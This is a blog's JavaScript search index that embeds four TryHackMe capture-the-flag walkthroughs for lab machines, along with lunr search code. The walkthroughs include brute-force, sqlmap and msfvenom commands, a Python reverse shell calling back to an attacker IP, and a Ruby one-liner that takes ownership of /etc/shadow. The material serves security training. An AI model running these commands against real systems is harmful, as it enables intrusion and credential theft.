
var documents = [{
    "id": 0,
    "url": "http://localhost:4000/404.html",
    "title": "404",
    "body": "404 Page does not exist!Please use the search bar at the top or visit our homepage! "
    }, {
    "id": 1,
    "url": "http://localhost:4000/about",
    "title": "About",
    "body": "STILL DEVELOPMENT. . . . : "
    }, {
    "id": 2,
    "url": "http://localhost:4000/categories",
    "title": "Categories",
    "body": ""
    }, {
    "id": 3,
    "url": "http://localhost:4000/",
    "title": "Home",
    "body": "      Featured:                                                                                                                                                                                                           TryHackMe: Internal CTF Writeup                              :               TryHackMe linux penetration testing challenge machine Internal boot2root walkthrough. Discovery Part:                                                                                                                                                                       Sinameki Sarp                                14 Dec 2022                                                                                                                                                                                                                                                                                                                  TryHackMe: Daily Bugle CTF Writeup                              :               TryHackMe hard level linux machine Daily Bugle boot2root walkthrough. :                                                                                                                                                                       Sinameki Sarp                                05 Dec 2022                                                                                                                                                                                                                                                                                                                  TryHackMe: Steel Mountain CTF Writeup                              :               TryHackMe easy level windows machine Steel Mountain boot2root walkthrough. :                                                                                                                                                                       Sinameki Sarp                                27 Nov 2022                                                                                                                                                                                                                                                                                                                  TryHackMe: Empline CTF Writeup                              :               TryHackMe medium level web machine Empline boot2root walkthrough. Discovery Part:                                                                                                                                                                       Sinameki Sarp                                24 Nov 2022                                                                                                                      All Stories:             "
    }, {
    "id": 4,
    "url": "http://localhost:4000/robots.txt",
    "title": "",
    "body": "      Sitemap: {{ “sitemap. xml”   absolute_url }}   "
    }, {
    "id": 5,
    "url": "http://localhost:4000/TryHackMe-Internal/",
    "title": "TryHackMe: Internal CTF Writeup",
    "body": "2022/12/14 - TryHackMe linux penetration testing challenge machine Internal boot2root walkthrough. Discovery Part: Start with port scan with Nmap tool. 1sudo nmap -sC -sV -p- -vv 10. 10. 116. 99 Server has “ssh” and “web” service. Go to web page.  There is a default Apache2 page. Find directories with gobuster tool. 1gobuster dir -u http://10. 10. 116. 99/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt -x php,html,txt Go to wordpress directory.  Modify “/etc/hosts” file to reflect internal. thm 1nano /etc/hosts It look like web page maden with Wordpress. Use “wpscan” tool for enumurate informations. 1wpscan --url http://internal. thm/wordpress/ -e ap,u  After scan proccess I try to find exploit “WP v5. 4. 2” but couldn’t find. Then I search any sensitive information in web page but nothing in there.  There is one user (”admin”) try to find password with bruteforce. 1wpscan --url http://internal. thm/wordpress/ -U admin -P /usr/share/wordlists/rockyou. txt --password-attack wp-login Login wp-login with admin user and password.  Enumeration Part: Go to Apperance&gt;Theme Editor Change one of the “Theme files” to reverse shell code.  Listen your port with netcat tool and… Change shell to tty shell. First check which version of python in the system then run python code. 1python -c 'import pty;pty. spawn( /bin/bash )' Find which users in the system. Go to /home directory and list files and directories in the directory.  There is one user aubreanna however we don’t have a permission to access directory. Go to /opt directory.  Read wp-save. txt file.  Login aubreanna user with the credentials.  Privilege Escalation Part: Read jenkins. txt file.  We need to “SSH Port Forward” to access 172. 17. 0. 2:8080 1ssh -L 4545:172. 17. 0. 2:8080 aubreanna@internal. thm Go to “http://localhost:4545/”.   I try to find credentials but there is no credential info in the server. Find credentials with bruteforce. 1hydra -l admin -P /usr/share/wordlists/rockyou. txt localhost -s 4545 http-post-form  /j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:loginError  Login admin user.  Select Manage Jenkins &gt; Script Console.  In this section you can execute Groovy script. Execute Groovy reverse shell code and list port with netcat.  Go to /opt directory and read note. txt file.  Login root wtih the credentials.  THANK YOU FOR READING 🙂"
    }, {
    "id": 6,
    "url": "http://localhost:4000/TryHackMe-Daily-Bugle/",
    "title": "TryHackMe: Daily Bugle CTF Writeup",
    "body": "2022/12/05 - TryHackMe hard level linux machine Daily Bugle boot2root walkthrough. DiscoveryPart: Start with port scan with Nmap tool. 1sudo nmap -sC -sC -p- -vv 10. 10. 4. 252 Server has a ssh service,web service and database service. Let’s go to web page.  Try to find directory and files with gobuster tool. 1sudo gobuster dir -u http://10. 10. 4. 252/ -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt -t 100 -x php,txt,html There are some interesting directories and files. Continue with README. txt file.  This web page made with “Joomla 3. 7 version”. Search Google to find any vulnerability for the version.  Looks like the version has “SQL Injection” vulnerability and there is how can we exploit. Enumeration Part: Let’s enumerate with sqlmap tool. 1sudo sqlmap -u  http://10. 10. 4. 252/index. php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml  --risk=3 --level=5 --random-agent --dbs -p list[fullordering] Continue with “joomla” database and extract tables.  Continue with “#_users” table and extract columns.  Sqlmap find “id,name,username,email,password” columns so we don’t have to wait finish the process.  We found username and password’s hash. Let’s continue with crack hash. I will use “JohnTheRipper” tool. 1sudo john hash --wordlist=/usr/share/wordlists/rockyou. txt Crack the hash can be take long time than expected so don’t cancel the procces until finish! Try to login Joomla admin panel with these credentials.  Let’s get the shell. First go to template section. Select one of the templates then select and change one of the php file to your reverse shell code. Press preview template button.  I spawned tty shell with python.  1python -c 'import pty;pty. spawn( /bin/bash )'I went to home directory to check users There is one user but we don’t have permission to go jjameson directory. I went to /var/www/html directory to find any config file.  Read configuration. php file.  Let’s try to use password for jjameson user. Privilege Escalation Part: Check jjameson user sudo permissions.  jjameson can use sudo with “/usr/bin/yum”. Go to GTFOBINS and search “/usr/bin/yum”.  THANK YOU FOR READING 🙂"
    }, {
    "id": 7,
    "url": "http://localhost:4000/TryHackMe-SteelMountain/",
    "title": "TryHackMe: Steel Mountain CTF Writeup",
    "body": "2022/11/27 - TryHackMe easy level windows machine Steel Mountain boot2root walkthrough. Discovery Part: Let’s begin with nmap port scan. 1nmap -sC -sV -vv -p- 10. 10. 161. 65 There are 2 web server on the ports. 80 and 8080. Nmap trying to find all ports with “-p-” **argument but it will be take time so let’s starts with web servers.  Source code: I try directory fuzzing but nothing in there. Check port 8080.  This page is interesting because there is file server version info in “Server Information” section. I Search “HttpFileServer 2. 3” on the internet.  Full name is “Rejetto Http File Server”. Let’s find is there any vulnerabilty for version.  It’s looks like “metasploit” has “RCE(Remote Code Execution)” exploit. Go to msfconsole… Enumeration Part: Search exploit and select what we want.  Look and set exploit’s options. 1show options We need to change “RHOSTS,RPORT,LHOST,LPORT,SRVHOST,SRVPORT”. **RHOST** ⇒ &lt;Target-Ip&gt; (In my case will be 10. 10. 161. 65) **RPORT** ⇒ &lt;Target-Port&gt; (In my case will be 8080) **LHOST** ⇒ &lt;Local-Ip&gt; (In my case will be 10. 10. 121. 211) **LPORT** ⇒ &lt;Listen-Port&gt; (In my case will be 10. 10. 121. 211) **SRVHOST** ⇒ &lt;Local-WebServer-Ip&gt; (In my case will be 10. 10. 121. 211) **SRVPORT** ⇒ &lt;Local-WebServer-Port&gt; (In my case will be 4545) 1set &lt;Option-Name&gt; = VALUEWe complete to assign all necessary option. Let’s run exploit.  💡 `**Note: Exploit run can take times you must wait until finish and also if exploit not work you should check options and run again**` It’s looks like we are “bill” user. Let’s go to “C:\Users\bill\Desktop” and find user flag.  Privilege Escalation Part: Check system has any privilege escalation vulnerability. I will use “winpeas” tool. First upload “winpeas. exe” to target machine. (WinPeas: https://github. com/carlospolop/PEASS-ng/tree/master/winPEAS) We need to access “Windows Powershell” to run winPEAS. exe. First we have to load powershell module to our meterpreter. 1load powershellThen we need to start powershell command. 1powershell_shelland run . /winPEAS. exe on powershell.  and also we can use “PowerUp. ps1” powershell script for find to way privledge escaletion. (Both tool is working correctly and give same result) PowerUp. Ps1:https://github. com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp. ps1  with both script result we find our user has permission to write and add file “AdvancedSystemCareService9” service and also this service can restart with manually. First we need to create executable reverse shell for root user. We can use “msfvenom” tool. 1msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 121. 211 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced. exeOur executable file is ready. Let’s upload the machine and rename to “ASCService. exe” Change to location and overwrite to file.  Our exe is ready. In another terminal we need to listen port which we specifed msfvenom. 1nc -lvnp 4443First stop the service then start again. Stop: sc stop **AdvancedSystemCareService9** Start: sc start **AdvancedSystemCareService9** THANK YOU FOR READING 🙂: "
    }, {
    "id": 8,
    "url": "http://localhost:4000/TryHackMe-Empline/",
    "title": "TryHackMe: Empline CTF Writeup",
    "body": "2022/11/24 - TryHackMe medium level web machine Empline boot2root walkthrough. Discovery Part: First thing I scan all ports what services are running on the server. 1sudo nmap -sC -sV -p- 10. 10. 70. 209 Server has a web service, ssh service and mysql database. Then I go to webpage.  Nothing is there… so I wonder is there any subdomain. First assigned ip to empline. thm in “/etc/hosts” document. Then I use wfuzz for find subdomains. 1sudo wfuzz -H  Host:FUZZ. empline. thm  -u http://empline. thm/ -w /usr/share/wordlists/SecList So there is one subdomain “job. empline. thm”. I look what is in there and I find login page and also “opencats” is running on the system. I checked source code any information about “opencats version”.  So I know version number and I search any exploit for “opencats 0. 9. 4”.  Enumeration Part: Perfect!! There is a “RCE(Remote Code Execution)” exploit suitable for the machine. I get the exploit from searchsploit and run…. .  It is working!!! But something is wrong. Yes I can run the commands but its not like real shell.  It is not exactly shell but we can get shell easily from command execution. Server has python3 so I can run python code. I made reverse shell payload with python. 1python3 -c 'import socket,subprocess,os;s=socket. socket(socket. AF_INET,socket. SOCK_STREAM);s. connect(( 10. 8. 8. 50 ,1234));os. dup2(s. fileno(),0);os. dup2(s. fileno(),1);os. dup2(s. fileno(),2);subprocess. call([ /bin/sh , -i ])'I run the python code on target machine and In my machine I use netcat for listen port. 1nc -lvnp 1234 I got the shell… I checked is there any config files for “opencats”. I went to “/var/www/html/opencats” folder. Let’s look files.  “config. php” file can contains important data. I read the file with cat command.  I can login mysql database with this information. Let’s try… I succesfully loged in with credentials. I found databases. Let’s continue with opencats.  “user” table looks interesting.  There are encrypted passwords. I check “crackstation. net” I know the password but I need user’s name for ssh. I looked users on the machine.  Try login ssh with username and password.  Privilege Escalation Part: Find and read user flag.  Last thing I need to become root for successfully finish the machine. I upload “linpeas. sh” tool for find any information become root.  Linpeas shows there are some capabilities user can. “/usr/local/bin/ruby = cap_chown+ep” means user can change any file’s owner with ruby. I change “/etc/shadow” file’s owner because if user write the shadow file then can change the root’s password. 1ruby -e 'require  fileutils ; FileUtils. chown  george ,  george ,  /etc/shadow ' I changed root’s password. Let’s try to login root.  THANK YOU FOR READING 🙂: "
    }];

var idx = lunr(function () {
    this.ref('id')
    this.field('title')
    this.field('body')

    documents.forEach(function (doc) {
        this.add(doc)
    }, this)
});
function lunr_search(term) {
    document.getElementById('lunrsearchresults').innerHTML = '<ul></ul>';
    if(term) {
        document.getElementById('lunrsearchresults').innerHTML = "<p>Search results for '" + term + "'</p>" + document.getElementById('lunrsearchresults').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><br /><span class='body'>"+ body +"</span><br /><span class='url'>"+ url +"</span></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>No results found...</li>";
        }
    }
    return false;
}

function lunr_search(term) {
    $('#lunrsearchresults').show( 400 );
    $( "body" ).addClass( "modal-open" );
    
    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow-lg" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-danger btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
    if(term) {
        document.getElementById('modtit').innerHTML = "<h5 class='modal-title'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><br /><small><span class='body'>"+ body +"</span><br /><span class='url'>"+ url +"</span></small></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>Sorry, no results found. Close & try a different search!</li>";
        }
    }
    return false;
}
    
$(function() {
    $("#lunrsearchresults").on('click', '#btnx', function () {
        $('#lunrsearchresults').hide( 5 );
        $( "body" ).removeClass( "modal-open" );
    });
});